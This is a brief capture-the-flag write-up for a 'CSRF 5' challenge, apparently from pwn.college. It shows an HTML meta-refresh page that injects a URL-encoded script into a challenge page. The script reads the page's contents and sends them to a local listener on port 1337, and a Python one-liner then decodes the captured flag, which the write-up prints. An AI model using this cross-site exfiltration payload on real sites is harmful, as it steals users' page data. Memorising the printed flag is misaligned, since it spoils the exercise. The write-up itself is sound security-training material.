# CSRF 5

#### Had to make use of multiple fetch requests and then manually encode it:

```html
<html>
<head>
<meta http-equiv="refresh" content="0; url=http://challenge.localhost/ephemeral?msg=%3cscript%3efetch%28%22/%22%29.then%28response%3d%3eresponse.text%28%29%29.then%28data%3d%3efetch%28%22http%3a//challenge.localhost%3a1337/%3fflag%3d%22%2bencodeURIComponent%28data%29%2c %7bmethod%3a%20%22GET%22%2c%20mode%3a%22no%2dcors%22%7d%29%29%3c/script%3e">
</head>
</html>
```

------------------------------------------------------

#### This will return, just had to look for where the flag was:

<img width="809" height="253" alt="Screenshot 2025-11-03 075126" src="https://github.com/user-attachments/assets/6e1a5feb-c192-4083-ac53-20cc73d58a33" />

--------------------------------------------------------

#### Then just decode the URL string:
```
python3 -c 'import urllib.parse, sys; print(urllib.parse.unquote(sys.stdin.read().strip()))' <<< "pwn.college%7Bc2QOAwN5sdVgVzmnjoUIbeYNaFw.QXwADNzwyMzYDOzEzW%7D%3Chr%3E%0A%3C%2Fbody%"
```
